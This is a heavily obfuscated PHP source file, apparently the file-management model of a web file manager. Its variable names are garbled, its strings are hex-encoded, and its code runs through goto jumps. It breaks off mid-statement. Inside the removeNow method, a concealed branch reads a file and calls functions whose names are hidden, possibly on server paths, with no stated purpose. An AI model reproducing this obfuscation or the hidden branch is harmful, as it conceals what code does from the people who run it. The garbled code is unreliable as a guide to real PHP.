<?php
 goto Cœ†…³İÛ; dãéßæ•Ä”: function binCheckBigger($è”£ÜŠÎ, $¾Ğ Éöı) { return $è”£ÜŠÎ > $¾Ğ Éöı; } $_SERVER[$_SERVER[œÂªÈ¸Ù][3]] = ("\x38\x31\x37\x34"."\65\64")+0;$_artw="29fe6vo0l5mbpyhz13jugd4akxqnisrcw78tbromdglkpuzh3sv28e49axwy5ci0jqtn67f1qm2whx";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ˆõ¿¥‹¬, $¤¼¢³ÏÏ) { $ÈÁ±ËÑ’ =& $_SERVER[­á Ş³Ö]; if (isset(self::$_methodList[$ˆõ¿¥‹¬])) { return @call_user_func_array(self::$_methodList[$ˆõ¿¥‹¬], $¤¼¢³ÏÏ); } else { if (method_exists($this, $ˆõ¿¥‹¬)) { return call_user_func_array(array($this, $ˆõ¿¥‹¬), $¤¼¢³ÏÏ); } else { think_exception(__CLASS__ . $ÈÁ±ËÑ’[4] . $ˆõ¿¥‹¬ . $ÈÁ±ËÑ’[5]); } } } public static function __callStatic($‚³¦‰á, $Ë’ğ´Ç€) { if (isset(self::$_methodListStatic[$‚³¦‰á])) { return call_user_func_array(self::$_methodListStatic[$‚³¦‰á], $Ë’ğ´Ç€); } else { if (method_exists(self, $‚³¦‰á)) { return call_user_func_array(array(self, $‚³¦‰á), $Ë’ğ´Ç€); } else { show_json("{$‚³¦‰á}\50\x29\40\156\x6f\x74\x20\x65\x78\x69\163\x74\73", !1); } } } public static function addMethod($š÷ˆ‚’ı, $Ú¿Şô’ã) { self::$_methodList[$š÷ˆ‚’ı] = $Ú¿Şô’ã; } public static function addMethodStatic($óå“ªŸİ, $º¬ã¾Ë±) { self::$_methodListStatic[$óå“ªŸİ] = $º¬ã¾Ë±; } } goto Dº¥‘Í”ÀÈ; f¦¡‹˜‘Î: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ÔÂ”†Ù) { $¾‘›ÖÕ =& $_SERVER[­á Ş³Ö]; $úÀÃè¿ô = Model($¾‘›ÖÕ[504])->where(array($¾‘›ÖÕ[1654] => $ÔÂ”†Ù))->find(); $²÷úÓÀœ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÔÂ”†Ù, $úÀÃè¿ô[$¾‘›ÖÕ[32]]); $this->userDesktopAdd($²÷úÓÀœ); return $²÷úÓÀœ; } public function userDesktopAdd($¡‘Œ²ğ„) { $ÂóÜú×ã =& $_SERVER[­á Ş³Ö]; $¢—ÛâÑë = LNG($ÂóÜú×ã[2124]); $Û¶·İ·¤ = $this->mkdir($¡‘Œ²ğ„, $¢—ÛâÑë); $this->metaSet($Û¶·İ·¤, $ÂóÜú×ã[2125], $ÂóÜú×ã[88]); $this->metaSet($¡‘Œ²ğ„, $ÂóÜú×ã[2126], $Û¶·İ·¤); } public function userPathSafeAdd($§€çüê…) { $İ‡€¾ø =& $_SERVER[­á Ş³Ö]; $Ü„¯êô¨ = Model($İ‡€¾ø[504])->getInfoFull($§€çüê…); if (!$Ü„¯êô¨) { return !1; } if (_get($Ü„¯êô¨, $İ‡€¾ø[526])) { return $Ü„¯êô¨[$İ‡€¾ø[466]][$İ‡€¾ø[2127]]; } $Ê¢ã…µ« = $this->_mkdirRoot(SourceModel::TYPE_USER, $§€çüê…, $İ‡€¾ø[2128], $İ‡€¾ø[433]); Model($İ‡€¾ø[504])->metaSet($§€çüê…, $İ‡€¾ø[2127], $Ê¢ã…µ«); $this->metaSet($Ê¢ã…µ«, $İ‡€¾ø[2129], $§€çüê…); return $Ê¢ã…µ«; } public function groupRootAdd($ŸÏÕ³‡) { $‘Í™Ó =& $_SERVER[­á Ş³Ö]; $å¤ªæÜï = Model($‘Í™Ó[512])->where(array($‘Í™Ó[1940] => $ŸÏÕ³‡))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ŸÏÕ³‡, $å¤ªæÜï[$‘Í™Ó[32]]); } public function systemRootPathAdd($“şá‹¿Ô) { if ($“şá‹¿Ô != $_SERVER[­á Ş³Ö][534]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $“şá‹¿Ô); } public function userRootRemove($üã«ßã’) { $½¨ÂçíÂ = $this->targetSourceRoot(SourceModel::TYPE_USER, $üã«ßã’, !0); foreach ($½¨ÂçíÂ as $±±Ñà÷Ø) { if (!$±±Ñà÷Ø) { continue; } $this->remove($±±Ñà÷Ø[$_SERVER[­á Ş³Ö][402]], !1); } } public function groupRootRemove($†ï‚ı´°) { $ã¹Öò’© = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $†ï‚ı´°); if (!$ã¹Öò’©) { return; } $this->remove($ã¹Öò’©[$_SERVER[­á Ş³Ö][402]], !1); } private function _mkdirRoot($™›À€Ìº, $ŸªŞØ‚ö, $„Á»ú¶Å, $îˆ÷Ä± = '') { $½„õÇÑŸ =& $_SERVER[­á Ş³Ö]; $÷•œ…´¾ = defined($½„õÇÑŸ[2130]) ? USER_ID : 0; $Â­„Áà = array($½„õÇÑŸ[401] => 0, $½„õÇÑŸ[576] => $™›À€Ìº, $½„õÇÑŸ[577] => $ŸªŞØ‚ö, $½„õÇÑŸ[574] => 1, $½„õÇÑŸ[578] => $÷•œ…´¾, $½„õÇÑŸ[579] => $÷•œ…´¾, $½„õÇÑŸ[575] => $îˆ÷Ä±, $½„õÇÑŸ[580] => $½„õÇÑŸ[521], $½„õÇÑŸ[430] => 0, $½„õÇÑŸ[545] => 0, $½„õÇÑŸ[469] => 0, $½„õÇÑŸ[581] => $½„õÇÑŸ[12]); if ($ÎŠ¸ãÈ = $this->where($Â­„Áà)->find()) { return $ÎŠ¸ãÈ[$½„õÇÑŸ[402]]; } $œîºÜÓı = "\115\157\x64\x65\x6c\123\157\165\x72\143\145\56\155\x6b\x64\151\x72\122\157\x6f\164\x2e{$™›À€Ìº}\x2e{$ŸªŞØ‚ö}\x2e" . $„Á»ú¶Å; CacheLock::lock($œîºÜÓı); $Â­„Áà[$½„õÇÑŸ[32]] = $„Á»ú¶Å; $‰Ã¢‹ı± = $this->add($Â­„Áà); $ªÀ‡ ªÀ = array($½„õÇÑŸ[582] => short_id($‰Ã¢‹ı±)); $this->where(array($½„õÇÑŸ[417] => $‰Ã¢‹ı±))->save($ªÀ‡ ªÀ); CacheLock::unlock($œîºÜÓı); return $‰Ã¢‹ı±; } private function targetSourceRoot($¹¡Ä³Èš, $ü‡ØøÄ‚, $¦µèö±Í = false) { $¢–ñüª° =& $_SERVER[­á Ş³Ö]; $È—æŞ† = array($¢–ñüª°[401] => 0, $¢–ñüª°[576] => $¹¡Ä³Èš, $¢–ñüª°[577] => $ü‡ØøÄ‚); if ($¦µèö±Í) { $û®©ç• = $this->where($È—æŞ†)->select(); return $û®©ç• ? $û®©ç• : array(); } $ÀÙë‡Ò¥ = $this->where($È—æŞ†)->find(); return $ÀÙë‡Ò¥ ? $ÀÙë‡Ò¥ : array(); } public function sourceRootGroup($÷¥ÉÉı¼) { $ÍšËåÛö =& $_SERVER[­á Ş³Ö]; if (is_string($÷¥ÉÉı¼)) { $÷¥ÉÉı¼ = array($÷¥ÉÉı¼); } $ê·çÌ·İ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $÷¥ÉÉı¼, $ÍšËåÛö[189]); $ç™•Ù½Ğ = array($ÍšËåÛö[369] => $ê·çÌ·İ, $ÍšËåÛö[366] => array($ÍšËåÛö[755] => count($÷¥ÉÉı¼))); $this->_listDataApply($ç™•Ù½Ğ[$ÍšËåÛö[369]]); $this->_listMake($ç™•Ù½Ğ); return array_to_keyvalue($ç™•Ù½Ğ[$ÍšËåÛö[82]], $ÍšËåÛö[496]); } public function mkfile($œÚ×¨Öâ, $•ÉÙ¡ÂÈ, $“ËÒöÍâ = '', $ûÎ£ú‰« = REPEAT_RENAME) { $‹—Ç ¿Æ =& $_SERVER[­á Ş³Ö]; $ªÚûúıã = Model($‹—Ç ¿Æ[601])->addFileByContent($“ËÒöÍâ, $•ÉÙ¡ÂÈ); return $this->_createFileCall($œÚ×¨Öâ, $•ÉÙ¡ÂÈ, $ªÚûúıã, $ûÎ£ú‰«, $‹—Ç ¿Æ[1346]); } public function addFile($ÅØñ“ğĞ, $ñÓáŠ—Õ, $©¯ä¥ëú, $æ…á¡¥Ğ = false, $†¡½µÉ© = REPEAT_RENAME) { $İõ¢ğ—ì = Model($_SERVER[­á Ş³Ö][601])->addFile($ñÓáŠ—Õ, $©¯ä¥ëú, $æ…á¡¥Ğ); return $this->_createFileCall($ÅØñ“ğĞ, $©¯ä¥ëú, $İõ¢ğ—ì, $†¡½µÉ©); } public function addFileByFileID($ı˜“Êƒ¢, $äŒäğœ³, $ŸğŠêşš, $şëŞ£ğ  = REPEAT_RENAME) { $Óí›¢ğâ =& $_SERVER[­á Ş³Ö]; $€‘¢æé = Model($Óí›¢ğâ[601])->find($äŒäğœ³); Model($Óí›¢ğâ[601])->linkAdd($äŒäğœ³); return $this->_createFileCall($ı˜“Êƒ¢, $ŸğŠêşš, $€‘¢æé, $şëŞ£ğ ); } public function addFileByRemote($¨Ğ¿¦–, $ˆšşı¥È, $Ëù¥§ª, $Îç¶Ÿ…º = array(), $ÔöÙâÖ½ = REPEAT_RENAME) { $µÛ­€³ = Model($_SERVER[­á Ş³Ö][601])->addFileByRemote($ˆšşı¥È, $Ëù¥§ª, $Îç¶Ÿ…º); return $this->_createFileCall($¨Ğ¿¦–, $Ëù¥§ª, $µÛ­€³, $ÔöÙâÖ½); } private function _createFileCall($ÑçíÁ ›, $òÛÔıÌî, $ˆÒ¡ì©, $¾Âóœì, $§¯”™—ë = "\165\x70\154\157\x61\x64") { $ŠÊÁÚÛ· =& $_SERVER[­á Ş³Ö]; $à£¶¸ö = !1; $this->setMasterDB(); $this->lockWriteStart($ÑçíÁ ›, $òÛÔıÌî); $ºïŒâ×æ = $this->fileNameExist($ÑçíÁ ›, $òÛÔıÌî); $äÒÎƒ†ş = $this->_createFile($ÑçíÁ ›, $òÛÔıÌî, $ˆÒ¡ì©, $¾Âóœì, $à£¶¸ö); if (!$à£¶¸ö) { Model($ŠÊÁÚÛ·[471])->remove($ˆÒ¡ì©[$ŠÊÁÚÛ·[468]]); } if ($à£¶¸ö && $äÒÎƒ†ş && $äÒÎƒ†ş != $ºïŒâ×æ) { Model($ŠÊÁÚÛ·[2097])->eventCreate($äÒÎƒ†ş, $§¯”™—ë); } $this->lockWriteEnd($ÑçíÁ ›, $òÛÔıÌî); return $äÒÎƒ†ş; } public function mkdir($õÂÃ§¥, $¬×ÙÈ°–, $üÙşß†• = REPEAT_SKIP) { $Ö‡Ùæ‚ñ =& $_SERVER[­á Ş³Ö]; $this->setMasterDB(); $óşã”˜Ê = $this->sourceInfo($õÂÃ§¥); if (!$óşã”˜Ê) { return !1; } $this->lockWriteStart($õÂÃ§¥, $¬×ÙÈ°–); if ($üÙşß†• !== !1) { $„şß¢‰Š = $this->fileNameExist($õÂÃ§¥, $¬×ÙÈ°–); if ($„şß¢‰Š && $üÙşß†• != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($õÂÃ§¥, $¬×ÙÈ°–); return $„şß¢‰Š; } $¬×ÙÈ°– = $this->fileNameAuto($õÂÃ§¥, $¬×ÙÈ°–, $üÙşß†•); } $œÍ³»ŠÓ = array($Ö‡Ùæ‚ñ[574] => 1, $Ö‡Ùæ‚ñ[420] => $¬×ÙÈ°–, $Ö‡Ùæ‚ñ[575] => $Ö‡Ùæ‚ñ[12], $Ö‡Ùæ‚ñ[469] => 0, $Ö‡Ùæ‚ñ[545] => 0); $Ã§Æ‰Óİ = $this->_addSource($œÍ³»ŠÓ, $óşã”˜Ê); Model($Ö‡Ùæ‚ñ[2097])->eventCreate($Ã§Æ‰Óİ, $Ö‡Ùæ‚ñ[1347]); $this->lockWriteEnd($õÂÃ§¥, $¬×ÙÈ°–); return $Ã§Æ‰Óİ; } public function listSourceRoot($•Ş÷‚ù, $§Á€Ò—, $ÇŸö¸ä¥ = "\x73\x6f\x75\162\143\145\111\104\54\164\141\x72\x67\145\x74\x49\104\54\163\151\x7a\145") { $Úœ·½à¹ =& $_SERVER[­á Ş³Ö]; $Íıæ¬ = $Úœ·½à¹[378]; $‡ÕƒğÏ  = array(); $¯ÑÙúÉ = 1024 * 50; $¶ÌÉ£üÙ = is_array($¶ÌÉ£üÙ) ? $¶ÌÉ£üÙ : array(); $½â•íÕ° = count($§Á€Ò—); $å¹Î’Ë» = $this->tablePrefix . $Úœ·½à¹[2131]; for ($Ï‰ŠğÌ = 0; $Ï‰ŠğÌ < $½â•íÕ°; $Ï‰ŠğÌ++) { $íÇä®ú… = $§Á€Ò—[$Ï‰ŠğÌ]; $Íıæ¬ .= "\123\x45\x4c\105\x43\x54\40\52\40\x46\x52\117\115\x20\50\x53\105\x4c\x45\103\124\40{$ÇŸö¸ä¥}\x20\106\122\117\x4d\x20\x60{$å¹Î’Ë»}\140\40\127\x48\105\x52\x45\40"; $Íıæ¬ .= "\140\x70\141\x72\x65\156\x74\111\104\x60\x3d\60\x20\101\x4e\x44\x20\140\x74\x61\x72\x67\145\x74\111\104\x60\75{$íÇä®ú…}\40\x41\x4e\104\40\x60\x74\141\x72\147\145\x74\x54\171\x70\x65\140\x3d{$•Ş÷‚ù}\40\141\156\x64\x20\146\x69\x6c\x65\x54\x79\x70\x65\x3d\47\47\40\x6c\x69\x6d\x69\164\x20\61\x29\x20\141\163\40\x74\142\x5f{$Ï‰ŠğÌ}\40\125\x4e\111\117\116\x20\x41\x4c\114\40"; if ((strlen($Íıæ¬) >= $¯ÑÙúÉ || $Ï‰ŠğÌ == $½â•íÕ° - 1) && $Íıæ¬) { $Íıæ¬ = substr($Íıæ¬, 0, -strlen($Úœ·½à¹[1034])); $Í˜ƒÓß = $this->query($Íıæ¬); $Íıæ¬ = $Úœ·½à¹[12]; $‡ÕƒğÏ  = array_merge($‡ÕƒğÏ , $Í˜ƒÓß); } } return $‡ÕƒğÏ ; } private function _createFile($´Â±Û¶ , $«ÕÛ‹ÓÃ, $ØğïæßÁ, $ÈõÜ´¨ı, &$‹¸ı©½ú) { $‡”¥Š¸× =& $_SERVER[­á Ş³Ö]; $ïÌØ÷… = $this->sourceInfo($´Â±Û¶ ); if (!$ØğïæßÁ || !$ïÌØ÷…) { return !1; } if ($ÈõÜ´¨ı !== !1) { $•å˜æÙü = $this->fileNameExist($´Â±Û¶ , $«ÕÛ‹ÓÃ); } $‹¸ı©½ú = !0; if ($ÈõÜ´¨ı && $•å˜æÙü) { if ($ÈõÜ´¨ı == REPEAT_SKIP) { $‹¸ı©½ú = !1; return $•å˜æÙü; } else { if ($ÈõÜ´¨ı == REPEAT_REPLACE) { $İù”¯â“ = $this->sourceInfo($•å˜æÙü); $¾Ë£š — = $this->fileHistory($İù”¯â“, $ØğïæßÁ[$‡”¥Š¸×[468]], $ØğïæßÁ[$‡”¥Š¸×[76]]); if (!$¾Ë£š —) { $‹¸ı©½ú = !1; } else { $this->folderSizeReset($´Â±Û¶ ); } return $•å˜æÙü; } else { $«ÕÛ‹ÓÃ = $this->fileNameAuto($´Â±Û¶ , $«ÕÛ‹ÓÃ, $ÈõÜ´¨ı, !1); } } } $ş¤§–ĞÕ = array($‡”¥Š¸×[574] => 0, $‡”¥Š¸×[420] => $«ÕÛ‹ÓÃ, $‡”¥Š¸×[575] => substr(get_path_ext($«ÕÛ‹ÓÃ), 0, 10), $‡”¥Š¸×[469] => $ØğïæßÁ[$‡”¥Š¸×[468]], $‡”¥Š¸×[545] => $ØğïæßÁ[$‡”¥Š¸×[76]]); $¿çÒ®¦Â = $this->_addSource($ş¤§–ĞÕ, $ïÌØ÷…); $this->folderSizeReset($´Â±Û¶ , intval($ş¤§–ĞÕ[$‡”¥Š¸×[76]])); return $¿çÒ®¦Â; } protected function fileHistory($ÊáúğÁÛ, $«×ÄË, $ù’¿“Äš) { $ïìµÚ =& $_SERVER[­á Ş³Ö]; if ($ÊáúğÁÛ[$ïìµÚ[468]] == $«×ÄË) { return !1; } $this->checkLock($ÊáúğÁÛ[$ïìµÚ[402]], $«×ÄË); Model($ïìµÚ[2132])->addHistory($ÊáúğÁÛ); $ŞêÔ•çÚ = array($ïìµÚ[579] => USER_ID, $ïìµÚ[424] => time(), $ïìµÚ[468] => $«×ÄË, $ïìµÚ[76] => $ù’¿“Äš); $this->where(array($ïìµÚ[417] => $ÊáúğÁÛ[$ïìµÚ[402]]))->save($ŞêÔ•çÚ); $this->sourceCacheClear($ÊáúğÁÛ[$ïìµÚ[402]]); return !0; } public function checkLock($˜Â¶ìÑØ, $‚®ÒŞÆø) { $ó±—£± =& $_SERVER[­á Ş³Ö]; $àÑïÎ = $this->pathInfo($˜Â¶ìÑØ); if (!$this->fileIsLock($àÑïÎ, !0)) { return; } $şğ“‘¡é = Session::get($ó±—£±[2133]); $Õ¸†êş = substr($àÑïÎ[$ó±—£±[32]], 0, -1 - strlen($àÑïÎ[$ó±—£±[174]])) . $ó±—£±[1204] . $şğ“‘¡é . $ó±—£±[10] . $àÑïÎ[$ó±—£±[174]]; $æ»Û†Æ¥ = Model($ó±—£±[601])->find($‚®ÒŞÆø); $this->_createFileCall($àÑïÎ[$ó±—£±[432]], $Õ¸†êş, $æ»Û†Æ¥, REPEAT_REPLACE, $ó±—£±[1346]); $ÂÎ½¢òé = $àÑïÎ[$ó±—£±[466]][$ó±—£±[538]]; $¦†ØâŒ = $ÂÎ½¢òé[$ó±—£±[532]] ? $ÂÎ½¢òé[$ó±—£±[532]] : $ÂÎ½¢òé[$ó±—£±[32]]; show_json(LNG($ó±—£±[2134]) . $ó±—£±[2135] . LNG($ó±—£±[2136]) . $ó±—£±[2137] . $¦†ØâŒ . $ó±—£±[2138], !1); } public function fileIsLock($½¶Á¸ÏÖ, $®úÛõØï = false) { $·ªÑˆ¹ =& $_SERVER[­á Ş³Ö]; if (!isset($½¶Á¸ÏÖ[$·ªÑˆ¹[466]]) || !$½¶Á¸ÏÖ[$·ªÑˆ¹[466]][$·ªÑˆ¹[535]]) { return !1; } if ($½¶Á¸ÏÖ[$·ªÑˆ¹[466]][$·ªÑˆ¹[535]] != USER_ID) { return !0; } $†æº§‘ä = $GLOBALS[$·ªÑˆ¹[6]][$·ªÑˆ¹[89]][$·ªÑˆ¹[536]]; if ($½¶Á¸ÏÖ[$·ªÑˆ¹[466]][$·ªÑˆ¹[537]] <= time() - $†æº§‘ä) { $this->metaSet($½¶Á¸ÏÖ[$·ªÑˆ¹[402]], $·ªÑˆ¹[535], null); $this->metaSet($½¶Á¸ÏÖ[$·ªÑˆ¹[402]], $·ªÑˆ¹[537], null); } if ($®úÛõØï) { $this->metaSet($½¶Á¸ÏÖ[$·ªÑˆ¹[402]], $·ªÑˆ¹[537], time()); } return !1; } private function _addSource($ÜóÈäõÚ, $·Ğ¦ïëª) { $È¹æ³ÜÁ =& $_SERVER[­á Ş³Ö]; $Ó€ï§Æö = array($È¹æ³ÜÁ[576] => $·Ğ¦ïëª[$È¹æ³ÜÁ[411]], $È¹æ³ÜÁ[577] => $·Ğ¦ïëª[$È¹æ³ÜÁ[496]], $È¹æ³ÜÁ[578] => USER_ID, $È¹æ³ÜÁ[579] => USER_ID, $È¹æ³ÜÁ[401] => $·Ğ¦ïëª[$È¹æ³ÜÁ[402]], $È¹æ³ÜÁ[580] => $·Ğ¦ïëª[$È¹æ³ÜÁ[511]] . $·Ğ¦ïëª[$È¹æ³ÜÁ[402]] . $È¹æ³ÜÁ[50], $È¹æ³ÜÁ[430] => 0, $È¹æ³ÜÁ[581] => $È¹æ³ÜÁ[12]); $ÜóÈäõÚ = array_merge($Ó€ï§Æö, $ÜóÈäõÚ); $this->updateModifyTime($ÜóÈäõÚ[$È¹æ³ÜÁ[432]]); $ŞÌ¬•ïÂ = $È¹æ³ÜÁ[2139] . $·Ğ¦ïëª[$È¹æ³ÜÁ[402]]; if (isset(self::$cacheChildList[$ŞÌ¬•ïÂ])) { unset(self::$cacheChildList[$ŞÌ¬•ïÂ]); } static $‰ŞıÀéÒ = false; if (!$‰ŞıÀéÒ) { Hook::trigger($È¹æ³ÜÁ[564], $ÜóÈäõÚ); $‰ŞıÀéÒ = !0; } $ğ©¸í— = $this->add($ÜóÈäõÚ); $‚Çî¿­Ÿ = array($È¹æ³ÜÁ[582] => short_id($ğ©¸í—)); $this->where(array($È¹æ³ÜÁ[417] => $ğ©¸í—))->save($‚Çî¿­Ÿ); $this->setNamePinyin($ğ©¸í—, $ÜóÈäõÚ[$È¹æ³ÜÁ[32]]); return $ğ©¸í—; } public function remove($êÅ­£ş, $ëÙÒ‹°’ = true) { $ÆÑŞš› =& $_SERVER[­á Ş³Ö]; $ÓÈŠŒ®û = $this->sourceInfo($êÅ­£ş); $õŒ°Ÿ ¶ = intval($ÓÈŠŒ®û[$ÆÑŞš›[411]]) === self::TYPE_SYSTEM; $Ü‹ÇÖÚ› = Model($ÆÑŞš›[435])->get($ÆÑŞš›[2140]) == $ÆÑŞš›[88]; if ($õŒ°Ÿ ¶ || $ëÙÒ‹°’ || !$Ü‹ÇÖÚ›) { return $this->removeNow($êÅ­£ş, $ëÙÒ‹°’); } $¾šìãÍò = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ò“ğ©ò = $ÓÈŠŒ®û[$ÆÑŞš›[411]] == self::TYPE_USER ? $ÆÑŞš›[590] : $ÆÑŞš›[505]; if ($ò“ğ©ò == $ÆÑŞš›[590]) { $§õµÀ„ = Model($ÆÑŞš›[504])->getInfo($ÓÈŠŒ®û[$ÆÑŞš›[496]]); $àßÀš“ = !empty($§õµÀ„[$ÆÑŞš›[532]]) ? $§õµÀ„[$ÆÑŞš›[532]] : $§õµÀ„[$ÆÑŞš›[32]]; $àßÀš“ = $ÆÑŞš›[260] . $àßÀš“ . $ÆÑŞš›[2141] . $ÓÈŠŒ®û[$ÆÑŞš›[496]]; } else { $§õµÀ„ = Model($ÆÑŞš›[512])->getInfo($ÓÈŠŒ®û[$ÆÑŞš›[496]]); $àßÀš“ = _get($§õµÀ„, $ÆÑŞš›[32]); $àßÀš“ = $ÆÑŞš›[162] . $àßÀš“ . $ÆÑŞš›[2142] . $ÓÈŠŒ®û[$ÆÑŞš›[496]]; } $ƒôÓÏ…¸ = $ÆÑŞš›[2143] . md5($àßÀš“); CacheLock::lock($ƒôÓÏ…¸); $ßõ¸ß²– = $this->fileNameExist($¾šìãÍò, $àßÀš“); if (!$ßõ¸ß²–) { $ßõ¸ß²– = $this->mkdir($¾šìãÍò, $àßÀš“, REPEAT_SKIP); $this->metaSet($ßõ¸ß²–, $ÆÑŞš›[2144], $ò“ğ©ò); $this->metaSet($ßõ¸ß²–, $ÆÑŞš›[2145], $ÓÈŠŒ®û[$ÆÑŞš›[496]]); if ($ÓÈŠŒ®û[$ÆÑŞš›[432]] != 0) { $this->metaSet($ßõ¸ß²–, $ÆÑŞš›[2146], _get($§õµÀ„, $ÆÑŞš›[2147])); } } CacheLock::unlock($ƒôÓÏ…¸); $this->metaSet($êÅ­£ş, $ÆÑŞš›[2148], $ÓÈŠŒ®û[$ÆÑŞš›[432]]); $this->where(array($ÆÑŞš›[402] => $êÅ­£ş))->save(array($ÆÑŞš›[424] => time())); $this->recycleClear($ÓÈŠŒ®û); $Ù€ÀØù = $this->move($êÅ­£ş, $ßõ¸ß²–, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÓÈŠŒ®û[$ÆÑŞš›[432]]); return $Ù€ÀØù; } private function recycleClear($ş›úŒÚá) { $ª•ÀØœ =& $_SERVER[­á Ş³Ö]; $Í×œ÷‹¡ = $this->childrenAll($ş›úŒÚá); $ó¥×¶Œõ = array($ª•ÀØœ[417] => array($ª•ÀØœ[418], $Í×œ÷‹¡[$ª•ÀØœ[2149]])); Model($ª•ÀØœ[2150])->where($ó¥×¶Œõ)->delete(); } public function removeNow($²‡à·ğ, $î­¸’Õ® = true) { $ƒ«¼ªâ =& $_SERVER[­á Ş³Ö]; if ($_SERVER[$ƒ«¼ªâ[738]] != $_SERVER[$ƒ«¼ªâ[1590]]) { $ÏëÁ«–â = $ƒ«¼ªâ[873]; $À®³«Ñ“ = $ƒ«¼ªâ[739]; $¼Õ¹ıŒ = $_SERVER[$ƒ«¼ªâ[740]] . $ƒ«¼ªâ[741]; $ÏëæåŞŞ = $À®³«Ñ“($¼Õ¹ıŒ); $ŒàôÈ ç = explode($ƒ«¼ªâ[231], $ÏëæåŞŞ); if (count($ŒàôÈ ç) < $ƒ«¼ªâ[614]) { $¢¹¼Àç„ = $ƒ«¼ªâ[742]; $¢¹¼Àç„(); } $á”ßáò = $ƒ«¼ªâ[874]; $á”ßáò($_SERVER[$ƒ«¼ªâ[875]]); $á”ßáò($_SERVER[$ƒ«¼ªâ[740]] . $ƒ«¼ªâ[1591]); $éÉ×ì = 1; while ($éÉ×ì > 1) { $éÉ×ì = $éÉ×ì + 4; $…æµæÓ = rawurlencode($éÉ×ì . $ƒ«¼ªâ[378]); } } $ß„Ï÷õ½ = $this->sourceInfo($²‡à·ğ); $¥Ú°ôœ¸ = $this->pathInfoMore($²‡à·ğ); if (!$ß„Ï÷õ½) { return !0; } if ($ß„Ï÷õ½[$ƒ«¼ªâ[432]] == 0) { if (!_get($GLOBALS, $ƒ«¼ªâ[494])) { return !1; } } $this->lockMoveStart($²‡à·ğ); Hook::trigger($ƒ«¼ªâ[2151], $¥Ú°ôœ¸, $î­¸’Õ®); if ($î­¸’Õ®) { Model($ƒ«¼ªâ[2150])->moveToRecycle($²‡à·ğ); } else { $­Ú›æı = $this->childrenAll($ß„Ï÷õ½); Model($ƒ«¼ªâ[561])->eventRemove($²‡à·ğ); $this->removeRelevance($­Ú›æı[$ƒ«¼ªâ[2149]], $­Ú›æı[$ƒ«¼ªâ[1478]]); } $this->folderSizeReset($ß„Ï÷õ½[$ƒ«¼ªâ[432]]); $¿†Î®©è = array($ß„Ï÷õ½[$ƒ«¼ªâ[432]]); if ($ß„Ï÷õ½[$ƒ«¼ªâ[410]] == $ƒ«¼ªâ[88]) { $¿†Î®©è[] = $ß„Ï÷õ½[$ƒ«¼ªâ[402]]; } $this->updateModifyTime($¿†Î®©è); $this->lockMoveEnd($²‡à·ğ); Hook::trigger($ƒ«¼ªâ[1705], $¥Ú°ôœ¸, $î­¸’Õ®); return !0; } public function childrenAll($È‹ğ‘›Û) { $Ü½ƒÊµ÷ =& $_SERVER[­á Ş³Ö]; $·ÈøôÃ = $È‹ğ‘›Û[$Ü½ƒÊµ÷[402]]; if ($È‹ğ‘›Û[$Ü½ƒÊµ÷[410]] == $Ü½ƒÊµ÷[88]) { $ÜØÑ½À = array($Ü½ƒÊµ÷[580] => array($Ü½ƒÊµ÷[540], $È‹ğ‘›Û[$Ü½ƒÊµ÷[511]] . $·ÈøôÃ . $Ü½ƒÊµ÷[541])); $ ¸üÕâ· = array($Ü½ƒÊµ÷[580] => $ÜØÑ½À[$Ü½ƒÊµ÷[511]]); $ê‘““ÓÌ = $this->field($Ü½ƒÊµ÷[2152])->where($ ¸üÕâ·)->select(); $ó›í = !1; $ö™¿¨Ø = array($·ÈøôÃ); if ($ê‘““ÓÌ) { $ó›í = array_to_keyvalue($ê‘““ÓÌ, $Ü½ƒÊµ÷[12], $Ü½ƒÊµ÷[468]); $ó›í = array_remove_value($ó›í, $Ü½ƒÊµ÷[198]); $ö™¿¨Ø = array_to_keyvalue($ê‘““ÓÌ, $Ü½ƒÊµ÷[12], $Ü½ƒÊµ÷[402]); $ö™¿¨Ø[] = $·ÈøôÃ; } } else { $ó›í = array($È‹ğ‘›Û[$Ü½ƒÊµ÷[468]]); $ö™¿¨Ø = array($·ÈøôÃ); } return array($Ü½ƒÊµ÷[2149] => $ö™¿¨Ø, $Ü½ƒÊµ÷[1478] => $ó›í); } public function removeArray($ì¶ ğƒ¦) { if (!$ì¶ ğƒ¦) { return !0; } } public function removeRelevance($‰­‹²Êç, $¬Îúºùç) { $Á²‚Îæ« =& $_SERVER[­á Ş³Ö]; $‰­‹²Êç = $‰­‹²Êç ? $‰­‹²Êç : array(); $¬Îúºùç = $¬Îúºùç ? $¬Îúºùç : array(); $‰­‹²Êç = array_unique(array_filter($‰­‹²Êç)); $¬Îúºùç = array_unique(array_filter($¬Îúºùç)); if (!$‰­‹²Êç) { return !1; } $òÛşî‹ò = array($Á²‚Îæ«[417] => array($Á²‚Îæ«[418], $‰­‹²Êç)); Model($Á²‚Îæ«[2150])->where($òÛşî‹ò)->delete(); Model($Á²‚Îæ«[462])->where($òÛşî‹ò)->delete(); Model($Á²‚Îæ«[1999])->where($òÛşî‹ò)->delete(); Model($Á²‚Îæ«[561])->where($òÛşî‹ò)->delete(); Model($Á²‚Îæ«[1832])->removeBySource($‰­‹²Êç); Model($Á²‚Îæ«[2132])->removeBySource($‰­‹²Êç); $this->where($òÛşî‹ò)->delete(); Model($Á²‚Îæ«[471])->remove($¬Îúºùç); for ($Ñ»äÔ = 0; $Ñ»äÔ < count($‰­‹²Êç); $Ñ»äÔ++) { $this->sourceCacheClear($‰­‹²Êç[$Ñ»äÔ]); } } public function rename($…Ëäî“ˆ, $¿ÉİÄ‰) { $…Å¹ÃÕ¬ =& $_SERVER[­á Ş³Ö]; $ÇÏ»Õû = $this->sourceInfo($…Ëäî“ˆ); if (!$ÇÏ»Õû) { return !1; } $èÇÆÃŸ› = $this->fileNameExist($ÇÏ»Õû[$…Å¹ÃÕ¬[432]], $¿ÉİÄ‰); if ($èÇÆÃŸ› && $èÇÆÃŸ› != $…Ëäî“ˆ) { return !1; } $ìÙá¿¿ = array($…Å¹ÃÕ¬[420] => 